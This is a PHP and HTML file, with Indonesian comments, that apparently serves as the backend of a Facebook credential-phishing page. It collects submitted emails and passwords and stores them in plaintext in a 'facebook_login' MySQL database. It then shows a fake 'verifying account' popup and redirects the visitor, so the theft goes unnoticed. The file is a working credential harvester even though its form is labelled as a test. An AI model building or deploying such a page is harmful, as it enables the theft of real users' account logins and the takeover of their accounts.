<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Konfigurasi koneksi database
    $servername = "localhost";
    $username = "root"; // Ganti jika username MySQL Anda berbeda
    $password = ""; // Ganti jika password MySQL Anda berbeda
    $dbname = "facebook_login";

    // Membuat koneksi
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Memeriksa koneksi
    if ($conn->connect_error) {
        echo "<script>
                setTimeout(function() {
                    var popup = document.createElement('div');
                    popup.className = 'custom-popup error';
                    popup.innerHTML = '<div class=\"popup-content\"><p>Oops! Terjadi gangguan teknis. Mohon maaf atas ketidaknyamanan ini.</p></div>';
                    document.body.appendChild(popup);
                    centerPopup(popup);
                    setTimeout(function() {
                        popup.style.display = 'none';
                        window.location.href = 'index.php';
                    }, 3000);
                }, 100);

                function centerPopup(popup) {
                    popup.style.position = 'fixed';
                    popup.style.top = '20px'; /* Geser ke bawah sedikit */
                    popup.style.left = '50%';
                    popup.style.transform = 'translateX(-50%)';
                    popup.style.padding = '20px';
                    popup.style.borderRadius = '100px'; /* Kotak bulat */
                    popup.style.backgroundColor = '#4285F4';
                    popup.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.1)';
                    popup.style.zIndex = '1000';
                    popup.style.fontSize = '16px';
                    popup.style.textAlign = 'center';
                    popup.style.width = '500px'; /* Sesuaikan lebar sesuai kebutuhan */
                    popup.style.fontFamily = 'Arial, sans-serif';
                }
              </script>";
        die();
    }

    // Mendapatkan nilai dari form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Prepared statement untuk mencegah SQL Injection
    $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $email, $password);

    if ($stmt->execute()) {
        // Menutup statement
        $stmt->close();
        $conn->close();
        
        // Pop-up sukses dan redirect setelah beberapa detik
        echo "<script>
                setTimeout(function() {
                    var popup = document.createElement('div');
                    popup.className = 'custom-popup success';
                    popup.innerHTML = '<div class=\"popup-content\"><p>Menverifikasi akun...</p></div>';
                    document.body.appendChild(popup);
                    centerPopup(popup);
                    setTimeout(function() {
                        popup.style.display = 'none';
                        window.location.href = 'index2.php';
                    }, 3000);
                }, 100);

                function centerPopup(popup) {
                    popup.style.position = 'fixed';
                    popup.style.top = '20px'; /* Geser ke bawah sedikit */
                    popup.style.left = '50%';
                    popup.style.transform = 'translateX(-50%)';
                    popup.style.padding = '10px';
                    popup.style.borderRadius = '100px'; /* Kotak bulat */
                    popup.style.backgroundColor = '#4285F4';
                    popup.style.color = '#fff';
                    popup.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.1)';
                    popup.style.zIndex = '1000';
                    popup.style.fontSize = '16px';
                    popup.style.textAlign = 'center';
                    popup.style.width = '500px'; /* Sesuaikan lebar sesuai kebutuhan */
                    popup.style.fontFamily = 'Arial, sans-serif';
                }
              </script>";
        exit;
    } else {
        // Pop-up gagal dan redirect setelah beberapa detik
        echo "<script>
                setTimeout(function() {
                    var popup = document.createElement('div');
                    popup.className = 'custom-popup error';
                    popup.innerHTML = '<div class=\"popup-content\"><p>Oops! Ada masalah saat menyimpan data. Silakan coba lagi nanti.</p></div>';
                    document.body.appendChild(popup);
                    centerPopup(popup);
                    setTimeout(function() {
                        popup.style.display = 'none';
                        window.location.href = 'index.php';
                    }, 3000);
                }, 100);

                function centerPopup(popup) {
                    popup.style.position = 'fixed';
                    popup.style.top = '20px'; /* Geser ke bawah sedikit */
                    popup.style.left = '50%';
                    popup.style.transform = 'translateX(-50%)';
                    popup.style.padding = '20px';
                    popup.style.borderRadius = '100px'; /* Kotak bulat */
                    popup.style.backgroundColor = '#4285F4';
                    popup.style.color = '#fff';
                    popup.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.1)';
                    popup.style.zIndex = '1000';
                    popup.style.fontSize = '16px';
                    popup.style.textAlign = 'center';
                    popup.style.width = '500px'; /* Sesuaikan lebar sesuai kebutuhan */
                    popup.style.fontFamily = 'Arial, sans-serif';
                }
              </script>";
    }

    // Menutup statement dan koneksi
    $stmt->close();
    $conn->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Popup Example</title>
<style>
    body {
        background-image: url('background.jpeg'); /* Ganti dengan path ke gambar Anda */
        background-size: cover;
        background-position: center;
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
    }

    .custom-popup {
        display: none;
    }

    .popup-content {
        padding: 20px;
        background-color: #fff;
        border: 1px solid #ccc;
        border-radius: 10px; /* Kotak bulat */
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        z-index: 1000;
        font-size: 16px;
        text-align: center;
        width: 300px; /* Sesuaikan lebar sesuai kebutuhan */
        margin: 0 auto; /* Memastikan pop-up berada di tengah */
        margin-top: 50px; /* Atur jarak dari atas sesuai kebutuhan */
        font-family: Arial, sans-serif;
    }

    .custom-popup.success .popup-content {
        background-color: blue;
        color: #fff;
    }

    .custom-popup.error .popup-content {
        background-color: #d9534f;
        color: #fff;
    }
</style>
</head>
<body>
    <!-- Form untuk pengujian -->
    <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
        <label for="email">Email:</label><br>
        <input type="text" id="email" name="email"><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Submit">
    </form>

    <!-- Script untuk menampilkan popup -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelector('form').addEventListener('submit', function() {
                var popup = document.createElement('div');
                popup.className = 'custom-popup';
                document.body.appendChild(popup);
            });
        });
    </script>
</body>
</html>
